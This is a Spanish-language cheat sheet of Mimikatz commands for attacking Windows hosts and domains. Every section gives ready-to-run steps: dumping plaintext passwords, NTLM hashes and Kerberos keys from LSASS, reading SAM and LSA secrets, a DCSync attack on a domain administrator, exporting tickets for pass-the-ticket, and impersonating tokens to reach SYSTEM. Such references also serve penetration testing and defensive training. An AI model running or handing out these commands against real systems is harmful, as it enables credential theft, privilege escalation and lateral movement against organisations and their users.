# Mimikatz Cheat Sheet

Comandos rápidos para la extracción de credenciales, secretos locales, tickets Kerberos y manipulación de tokens con Mimikatz.

---

## 1. Inicialización y Preparación

Requiere privilegios de Administrador local o SYSTEM.

* Iniciar entorno interactivo:
  ```cmd
  mimikatz.exe
  ```
* Habilitar privilegio de depuración (requerido para interactuar con LSASS):
  ```cmd
  mimikatz # privilege::debug
  ```
* Verificar identidad de ejecución actual:
  ```cmd
  mimikatz # coffee
  ```

---

## 2. Extracción de Credenciales en Memoria (LSASS)

* Volcar credenciales de las sesiones activas (texto plano, hashes NTLM, tickets Kerberos):
  ```cmd
  mimikatz # sekurlsa::logonpasswords
  ```
* Volcar módulos de autenticación específicos:
  * Hashes NTLM y LM: `mimikatz # sekurlsa::msv`
  * Proveedor WDigest (texto plano si aplica): `mimikatz # sekurlsa::wdigest`
  * Claves y tickets Kerberos: `mimikatz # sekurlsa::kerberos`
  * Proveedores SSP: `mimikatz # sekurlsa::ssp`

---

## 3. Secretos Locales y del Dominio (SAM / LSA)

* Volcar base de datos SAM local (hashes NTLM locales):
  ```cmd
  mimikatz # lsadump::sam
  ```
* Volcar secretos de la LSA (contraseñas de cuentas de servicio locales):
  ```cmd
  mimikatz # lsadump::secrets
  ```
* Ejecutar ataque DCSync remoto para obtener hash de un usuario de dominio:
  ```cmd
  mimikatz # lsadump::dcsync /user:Administrador /domain:dominio.local
  ```

---

## 4. Tickets Kerberos y Movimiento Lateral

* Listar tickets Kerberos almacenados en la sesión:
  ```cmd
  mimikatz # kerberos::list
  
  # Alternativa (secuestro de memoria global de tickets):
  mimikatz # sekurlsa::tickets
  ```
* Exportar todos los tickets en memoria a disco (archivos `.kirbi`):
  ```cmd
  mimikatz # sekurlsa::tickets /export
  ```
* Cargar ticket Kerberos en la sesión actual (Pass-the-Ticket):
  ```cmd
  mimikatz # kerberos::ptt C:\Temp\ticket_administrador.kirbi
  ```

---

## 5. Gestión de Tokens e Impersonación

* Listar tokens de seguridad disponibles en el sistema:
  ```cmd
  mimikatz # token::list
  ```
* Impersonar el token de mayor privilegio (elevación a SYSTEM):
  ```cmd
  mimikatz # token::elevate
  
  # Revertir impersonación:
  mimikatz # token::revert
  ```
* Impersonar token de un usuario de dominio específico:
  ```cmd
  mimikatz # token::elevate /user:Administrador
  ```

---

## 6. Análisis Offline de Minidumps de LSASS

Análisis en máquina controlada a partir de un volcado de memoria física de LSASS (evita ejecución en caliente en la víctima).

1. Cargar el minidump en Mimikatz:
   ```cmd
   mimikatz # sekurlsa::minidump lsass.dmp
   ```
2. Ejecutar comandos habituales:
   ```cmd
   mimikatz # sekurlsa::logonpasswords
   ```
